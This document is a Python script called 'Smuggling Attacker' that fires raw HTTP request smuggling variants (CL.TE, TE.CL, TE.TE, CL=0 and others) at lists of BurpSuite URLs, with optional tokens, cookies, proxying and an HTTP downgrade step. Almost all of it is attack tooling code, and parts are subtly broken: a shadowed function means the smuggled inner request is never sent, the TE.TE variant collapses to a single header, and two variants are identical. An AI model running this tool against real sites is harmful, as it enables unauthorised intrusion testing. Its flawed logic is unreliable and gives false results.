#!/usr/bin/env python3
"""
Smuggling Attacker
Automated HTTP request smuggling workflow inspired by PortSwigger labs.

Features:
- Accepts list of URLs pasted from BurpSuite (deduplicates base paths).
- Variants tested:
    * Content-Length = 5 with appended "0"
    * Content-Length = 0
    * No Content-Length
    * Only Transfer-Encoding: chunked
    * Both Content-Length and Transfer-Encoding
    * Neither Content-Length nor Transfer-Encoding
    * Classic TE.CL, TE.TE
- Method support: GET or POST, optional body for POST.
- Auth support: None / Bearer token / Cookie.
- Always sets Connection: keep-alive.
- Sequential execution with verbose progress.
- Flags success only when duplicate responses are seen (dup_signals >= 2).
- Prints successful attempts immediately in green with request/response.
- Consolidated summary of successful vs unsuccessful attempts at the end.
- Graceful Ctrl+C handling: shows results obtained so far.
"""

import sys
import socket
import ssl
from urllib.parse import urlparse
from colorama import Fore, Style, init
# Proxy configuration (set during interactive workflow)
use_proxy = False
proxy_host = None
proxy_port = None


init(autoreset=True)

# ---------------------------
# Networking helpers
# ---------------------------
def parse_url(target):
    target = target.strip()

    # Auto-add scheme if missing
    if "://" not in target:
        target = "http://" + target

    p = urlparse(target)

    scheme = p.scheme or "http"
    host = p.hostname
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path = f"{path}?{p.query}"

    return scheme, host, port, path

def test_variant(name, builder, host, port, path, use_tls, method, headers, body, url):

    # Add inner smuggling request
    inner = build_inner_request(host)
    if body:
        body = body + inner
    else:
        body = inner


def connect(host, port, use_tls=False):

    global use_proxy, proxy_host, proxy_port
    print(f"[DEBUG] Connecting to {host}:{port} | TLS={use_tls} | proxy={use_proxy}")


    # ---------- PROXY MODE ----------
    if use_proxy:
        # 1) Connect to proxy
        s = socket.create_connection((proxy_host, proxy_port), timeout=10)

        # If HTTPS, we MUST first send a CONNECT request
        if use_tls:
            connect_req = (
                f"CONNECT {host}:{port} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            s.sendall(connect_req.encode("ascii"))

            # Read proxy reply
            resp = s.recv(4096).decode("latin-1", errors="replace")
            if "200" not in resp:
                raise Exception(f"Proxy CONNECT failed: {resp}")

            # Now wrap TLS over the tunnel
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            s = ctx.wrap_socket(s, server_hostname=host)

        # If HTTP, we just send the raw request through proxy
        return s

    # ---------- DIRECT MODE ----------
    s = socket.create_connection((host, port), timeout=10)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def recv_all(sock):
    sock.settimeout(10)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def send_raw_request(host, port, use_tls, raw):
    s = connect(host, port, use_tls)
    try:
        s.sendall(raw.encode("latin-1"))
        data = recv_all(s)
        alpn = None
        if use_tls and hasattr(s, "selected_alpn_protocol"):
            alpn = s.selected_alpn_protocol()
        return data, alpn
    finally:
        s.close()

# ---------------------------
# Request builders
# ---------------------------

def build_request(host, path, method, headers, body, extra_headers, use_tls):

    global use_proxy

    # Build the correct request-line depending on proxy mode + TLS
    if use_proxy and not use_tls:
        # HTTP over proxy → requires absolute URL
        request_line = f"{method} http://{host}{path} HTTP/1.1"
    else:
        # HTTPS over proxy (after CONNECT) or direct-to-server → normal request-line
        request_line = f"{method} {path} HTTP/1.1"

    request = [request_line, f"Host: {host}", "Connection: keep-alive"]


    for k, v in headers.items():
        request.append(f"{k}: {v}")
    for k, v in extra_headers.items():
        request.append(f"{k}: {v}")
    request.append("")  # end headers
    if body:
        request.append(body)
    raw = "\r\n".join(request) + "\r\n"
    return raw

def build_inner_request(host):
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    )


def build_cl5(host, path, method, headers, body, use_tls):
    b = (body or "") + "0"
    return build_request(host, path, method, headers, b, {"Content-Length": str(len(b))}, use_tls)

def build_cl0(host, path, method, headers, body, use_tls):
    return build_request(host, path, method, headers, body, {"Content-Length": "0"}, use_tls)

def build_no_cl(host, path, method, headers, body, use_tls):
    return build_request(host, path, method, headers, body, {}, use_tls)

def build_te_only(host, path, method, headers, body, use_tls):
    return build_request(host, path, method, headers, body, {"Transfer-Encoding": "chunked"}, use_tls)

def build_cl_te(host, path, method, headers, body, use_tls):
    cl = str(len(body or ""))
    return build_request(host, path, method, headers, body, {
        "Content-Length": cl,
        "Transfer-Encoding": "chunked"
    }, use_tls)

def build_no_headers(host, path, method, headers, body, use_tls):
    return build_request(host, path, method, headers, body, {}, use_tls)

def build_te_cl(host, path, method, headers, body, use_tls):
    cl = str(len(body or ""))
    return build_request(host, path, method, headers, body, {
        "Transfer-Encoding": "chunked",
        "Content-Length": cl
    }, use_tls)

def build_te_te(host, path, method, headers, body, use_tls):
    return build_request(host, path, method, headers, body, {
        "Transfer-Encoding": "chunked",
        "Transfer-Encoding": "chunked"
    }, use_tls)


# ---------------------------
# Detection heuristics
# ---------------------------

def summarize_response(resp_bytes):
    text = resp_bytes.decode("latin-1", errors="replace")
    head, _, body = text.partition("\r\n\r\n")
    status_line = head.splitlines()[0] if head else ""
    dup_signals = sum(1 for line in text.splitlines() if line.startswith("HTTP/1.1 "))
    snippet = body[:300].replace("\r", " ").replace("\n", " ")
    return status_line, dup_signals, snippet

# ---------------------------
# Worker
# ---------------------------

def test_variant(name, builder, host, port, path, use_tls, method, headers, body, url):
    raw = builder(host, path, method, headers, body, use_tls)
    try:
        resp_bytes, alpn = send_raw_request(host, port, use_tls, raw)
        status_line, dup_signals, snippet = summarize_response(resp_bytes)
        is_success = dup_signals >= 2
        response_text = resp_bytes.decode("latin-1", errors="replace")[:1000]
        return {
            "url": url,
            "variant": name,
            "request": raw,
            "response": response_text,
            "status_line": status_line,
            "success": is_success
        }
    except Exception as e:
        return {
            "url": url,
            "variant": name,
            "request": raw,
            "response": f"Error: {e}",
            "status_line": "",
            "success": False
        }

# ---------------------------
# Interactive workflow
# ---------------------------

def run_interactive():
    print("=== Smuggling Attacker ===")
    print("Paste your list of URLs (from BurpSuite: Right-click → Copy all URLs).")
    print("End input with an empty line.\n")

    urls = []
    while True:
        line = input()
        if not line.strip():
            break
        urls.append(line.strip())

    if not urls:
        print("No URLs provided. Exiting.")
        sys.exit(1)

    unique_urls = {}
    for u in urls:
        scheme, host, port, path = parse_url(u)
        base = f"{scheme}://{host}:{port}{path}"
        if base not in unique_urls:
            unique_urls[base] = u

    print(f"\n[+] {len(urls)} URLs provided, reduced to {len(unique_urls)} unique base paths.\n")

    method = input("Choose method [GET/POST]: ").strip().upper()
    body = ""
    if method == "POST":
        print("Enter POST body (end with empty line):")
        lines = []
        while True:
            line = sys.stdin.readline()
            if not line or not line.strip():
                break
            lines.append(line.rstrip("\n"))
        body = "\n".join(lines)

    print("\nDo you need authentication headers?")
    print("1. No authentication")
    print("2. Bearer token")
    print("3. Cookie")
    auth_choice = input("Enter choice number: ").strip()

    user_headers = {}
    if auth_choice == "2":
        token = input("Enter Bearer token: ").strip()
        user_headers["Authorization"] = f"Bearer {token}"
    elif auth_choice == "3":
        cookie = input("Enter Cookie string: ").strip()
        user_headers["Cookie"] = cookie

    print("\nOptional: add extra headers (e.g., Content-Type: application/json). End with empty line.")
    while True:
        hline = input().strip()
        if not hline:
            break
        if ":" in hline:
            k, v = hline.split(":", 1)
            user_headers[k.strip()] = v.strip()


    print("\nDo you want to route requests through a BurpSuite proxy?")
    print("1. No (direct)")
    print("2. Yes (BurpSuite on 127.0.0.1:8080 or custom)")
    pchoice = input("Enter choice number: ").strip()

    global use_proxy, proxy_host, proxy_port

    if pchoice == "2":
        use_proxy = True
        host_input = input("Proxy host [default 127.0.0.1]: ").strip() or "127.0.0.1"
        port_input = input("Proxy port [default 8080]: ").strip() or "8080"
        proxy_host = host_input
        proxy_port = int(port_input)
        print(f"[+] Using BurpSuite proxy at {proxy_host}:{proxy_port}")
    else:
        use_proxy = False
        print("[+] Direct connection mode enabled (no proxy).")


    print("\n[+] Starting request smuggling tests sequentially...\n")

    variants = {
        "CL=5 with appended 0": build_cl5,
        "CL=0": build_cl0,
        "No Content-Length": build_no_cl,
        "TE only": build_te_only,
        "CL+TE": build_cl_te,
        "No headers": build_no_headers,
        "TE.CL": build_te_cl,
        "TE.TE": build_te_te,
    }

    affected = []
   

    failed = []

    try:
        for base, representative_url in unique_urls.items():
            scheme, host, port, path = parse_url(representative_url)
            use_tls = (scheme == "https")

            print(f"\n[+] Testing target: {representative_url}")

            for name, builder in variants.items():
                print(f"    -> Variant: {name}")
                result = test_variant(
                    name, builder,
                    host, port, path, use_tls,
                    method, user_headers, body,
                    representative_url
                )

                if result["success"]:
                    affected.append(result)
                    print(f"\n{Fore.GREEN}Target: {result['url']} ({result['variant']}){Style.RESET_ALL}")
                    print("=== Request Sent ===")
                    print(result["request"])
                    print("=== Response Received ===")
                    print(result["response"])
                else:
                    failed.append(result)

            # If HTTPS, also try HTTP downgrade on port 80
            if use_tls:
                print("    -> Testing HTTP downgrade")
                for name, builder in variants.items():
                    result = test_variant(
                        f"{name} (HTTP downgrade)", builder,
                        host, 80, path, False,
                        method, user_headers, body,
                        f"http://{host}{path}"
                    )
                    if result["success"]:
                        affected.append(result)
                        print(f"\n{Fore.GREEN}Target: {result['url']} ({result['variant']}){Style.RESET_ALL}")
                        print("=== Request Sent ===")
                        print(result["request"])
                        print("=== Response Received ===")
                        print(result["response"])
                    else:
                        failed.append(result)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user. Showing results obtained so far...{Style.RESET_ALL}")

    # Consolidated summary
    print("\n=== Summary ===\n")
    print(f"{Fore.GREEN}Successful Smuggling Attempts:{Style.RESET_ALL}")
    if affected:
        seen = set()
        for r in affected:
            key = (r["url"], r["variant"])
            if key in seen:
                continue
            seen.add(key)
            print(f"  - {r['url']} ({r['variant']})")
    else:
        print("  - None")

    print(f"\n{Fore.RED}No Smuggling Detected:{Style.RESET_ALL}")
    if failed:
        seenf = set()
        for r in failed:
            key = (r["url"], r["variant"])
            if key in seenf:
                continue
            seenf.add(key)
            print(f"  - {r['url']} ({r['variant']})")
    else:
        print("  - None")

if __name__ == "__main__":
    run_interactive()
